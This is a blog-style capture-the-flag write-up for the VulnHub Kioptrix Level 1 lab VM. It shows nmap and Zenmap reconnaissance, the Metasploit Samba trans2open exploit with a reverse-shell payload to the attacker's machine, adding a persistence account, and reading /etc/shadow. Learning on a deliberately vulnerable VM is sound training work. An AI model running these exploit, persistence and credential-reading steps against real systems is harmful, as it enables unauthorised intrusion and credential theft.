---
title: Kioptrix Level 1 writeup
description: Day 1 of 100 Days challenge
date: 2025-10-09
categories: [Vlunhub, 100Days]
tags: [Vlunhub, 100Days, day1, kioptrix_Level_1] 
---


# Kioptrix Level 1 writeup ✍️

--- 

## Challenge Description

Name: Kioptrix: Level 1 (#1) <br>
Date release: 17 Feb 2010 <br>
Author: Kioptrix <br>
Series: Kioptrix <br>

### Description
This Kioptrix VM Image are **easy** challenges. The object of the game is to **acquire root access** via any means possible (except actually hacking the VM server or player). The purpose of these games are to **learn** the **basic tools and techniques in vulnerability assessment and exploitation**. There are **more ways** then one to successfully complete the challenges.

Task File Download from here 👉 [Kioptrix Level 1]( https://download.vulnhub.com/kioptrix/Kioptrix_Level_1.rar)

### File Information
- Filename: Kioptrix_Level_1.rar
- File size: 186 MB
- MD5: 6DF1A7DFA555A220054FB98BA87FACD4
- SHA1: 98CA3F4C079254E6B272265608E7D22119350A37

> Check the File Hash is Downloaded properly or not

### Virtual Machine

Format: Virtual Machine (VMware) <br>
Operating System: Linux

---

## Points I have Learned

- Network Discovery using Nmap
  - `-sn` : finds host up or not
- Scaning Target using Zenmap
- Using Metaspolit To Exploit
- Maintaining Access

--- 

## Step By Step Process

### Step 1: Setup the LAB
- I used VMware to setup Target Machine.
- Extract the archive Downloaded
```bash
unrar x Kioptrix_Level_1.rar
```
Go To VMware File ➡️ open ➡️ Select `.vmx` file ➡️ Poweron the Machine

### Step 2: Finding Target IP address

Target is Living on our Network so, scan our Network to Find Target

#### Step 2.1: Finding Which is our Network

- Finding our IP address
```bash
ifconfig
```
output: 
![ifconfig output](/posts/Vlunhub/100Days/Day01_Kioptrix_Level_1/ifconfig.png)

- Here our subnetmask is `255.255.255.0` means `/24` CDIR haves 256 Hosts.

#### Step 2.2: Scanning Our Network To Find Target IP

- Using `nmap` with `-sn` gives **host is up OR not**.
```bash
nmap -sn 10.253.198.40/24
```
output: 
![Target Founded](/posts/Vlunhub/100Days/Day01_Kioptrix_Level_1/targetdiscover.png)

- Here `10.253.198.26` is our Target IP address


### Step 3: Finding Vulnerability

- Here I am Using `zenmap` To Find **open ports & Services**
![zenmap scan](/posts/Vlunhub/100Days/Day01_Kioptrix_Level_1/zenmapscan.png)

- Here I done **Intense Scan** Found some open ports.

| PORT   |   STATE | SERVICE   |   VERSION |
|--------|----------|----------|------------|
|22/tcp   | open | ssh         | OpenSSH 2.9p2 (protocol 1.99) |
|80/tcp   | open | http        | Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b) |
|111/tcp  | open | rpcbind     | 2 (RPC #100000) |
|139/tcp  | open | netbios-ssn | Samba smbd (workgroup: MYGROUP) |
|443/tcp  | open | ssl/https   | Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6 |
|32768/tcp |open | status      | 1 (RPC #100024) |

- I given output to the **ChatGpt** To Find which Services old
- It Says every Service Observing Here are **Old services**
- **Old services** Contain Vulnerabilities.

### Step 4: Exploitation

- I Used  `Metaspolit` to exploit the Target
- I selected port `139/tcp` to exploit

#### Step 4.1: Setting Exploit 

- searching Exploit 
```bash
search Samba
```
- there are several exploits i selected **69** exploit.
```bash
use exploit/linux/samba/trans2open
```

#### Step 4.2: Configuring Required Options

```bash
show options
```
![options](/posts/Vlunhub/100Days/Day01_Kioptrix_Level_1/showoptions.png)


```bash
set RHOSTS 10.253.198.26
```
![rhost](/posts/Vlunhub/100Days/Day01_Kioptrix_Level_1/setrhosts.png)

```bash
set LHOST 10.253.198.40
```
![lhost](/posts/Vlunhub/100Days/Day01_Kioptrix_Level_1/setlhost.png)

```bash
show payloads
```


```bash
set PAYLOAD payload/linux/x86/shell_reverse_tcp
```
![pyload](/posts/Vlunhub/100Days/Day01_Kioptrix_Level_1/setpayload.png)

#### Step 4.3: Running explot

```bash
exploit
```
![success](/posts/Vlunhub/100Days/Day01_Kioptrix_Level_1/exploitsuceesful.png)

- Successfully Gained `root` access

### Step 5: Maintaining Access

- For Login into Target Machine Manually I Changed `root` password
```bash
passwd
```
![changepasswd](/posts/Vlunhub/100Days/Day01_Kioptrix_Level_1/rootpasswdchange.png)

#### Step 5.1: Future Porpose

- login Target Machine Manually with `root` credentials
```bash
adduser new
```
- added user `new` for future login
```bash
passwd new
```
- adding password for `new` user.

![login](/posts/Vlunhub/100Days/Day01_Kioptrix_Level_1/maintainedaccess.png)

#### Step 5.2: Conformation that credendials are stored or not

- ALL **user credentials are Stored** in `/etc/passwd` their **hash** are stored in `/etc/shadow` files.

```bash
cat /etc/shadow
```

![shadow](/posts/Vlunhub/100Days/Day01_Kioptrix_Level_1/etc!shadow.png)


--- 

🚀 Successfully Completed Task.
